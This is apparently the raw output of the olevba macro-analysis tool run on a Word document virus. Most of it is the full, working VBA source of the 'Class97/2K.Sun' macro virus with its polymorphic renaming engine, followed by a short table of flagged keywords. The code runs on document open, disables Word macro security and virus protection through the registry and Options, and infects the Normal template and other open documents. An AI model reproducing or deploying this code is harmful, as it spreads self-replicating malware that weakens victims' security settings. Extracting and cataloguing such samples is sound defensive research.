olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.z-45d80ce719af3ef74fdf6ed67e2e5e0ddeca6ef1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.z-45d80ce719af3ef74fdf6ed67e2e5e0ddeca6ef1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Randomize
Const Sf192757 = "9.0", Cq9231 = "Macro", Nx503520 = 3, Es977890 = 0, Vk32326 = &H1, Gj310926 = 1
If Application.Version = Sf192757 Then
CommandBars(Cq9231).Controls(Nx503520).Enabled = (Rnd * Es977890)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Vk32326
Else
Options.VirusProtection = (Rnd * Es977890)
End If
Options.SaveNormalPrompt = (Rnd * Es977890)
Set Fx625847 = ThisDocument.VBProject.VBComponents(Gj310926).CodeModule
If MacroContainer = ActiveDocument Then Set Dj73689 = NormalTemplate.VBProject.VBComponents(Gj310926).CodeModule Else Set Dj73689 = ActiveDocument.VBProject.VBComponents(Gj310926).CodeModule: Fv703154 = (Rnd * Gj310926)
If Fx625847.countoflines <> Dj73689.countoflines Then
Dj73689.deletelines Gj310926, Dj73689.countoflines
Dj73689.insertlines Gj310926, Kg124776(Fx625847.lines(Gj310926, Fx625847.countoflines))
If Fv703154 <> Es977890 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Es977890)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function Kg124776(Vr925755) As String ' PVP v1.1
Const Es977890 = 0, Gj310926 = 1, Hr27639 = 21, Gt13859 = 22, Ar283631 = 65, Lr769743 = 122, Qp790133 = 999
Dim Sz8832(Gj310926 To Hr27639)
Sz8832(1) = "Sf192757": Sz8832(2) = "Cq9231": Sz8832(3) = "Nx503520": Sz8832(4) = "Es977890": Sz8832(5) = "Vk32326": Sz8832(6) = "Gj310926": Sz8832(7) = "Fx625847": Sz8832(8) = "Dj73689"
Sz8832(9) = "Hr27639": Sz8832(10) = "Gt13859": Sz8832(11) = "Ar283631": Sz8832(12) = "Lr769743": Sz8832(13) = "Qp790133": Sz8832(14) = "Kg124776": Sz8832(15) = "Sz8832": Sz8832(16) = "Tk74524"
Sz8832(17) = "Fj353293": Sz8832(18) = "Jm70677": Sz8832(19) = "Uq905459": Sz8832(20) = "Vr925755": Sz8832(21) = "Fv703154"
For Tk74524 = Gj310926 To Hr27639
Fj353293 = Chr(Ar283631 + Int(Rnd * Gt13859)) & Chr(Lr769743 - Int(Rnd * Gt13859)) & Int(Rnd * Qp790133) & Int(Rnd * Qp790133)
Jm70677 = Gj310926
Uq905459: Jm70677 = InStr(Jm70677 + Gj310926, Vr925755, Sz8832(Tk74524))
If Jm70677 <> Es977890 Then Vr925755 = Mid(Vr925755, Gj310926, (Jm70677 - Gj310926)) & Fj353293 & Mid(Vr925755, (Jm70677 + Len(Sz8832(Tk74524))), Len(Vr925755)): GoTo Uq905459
Next
Kg124776 = Vr925755
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

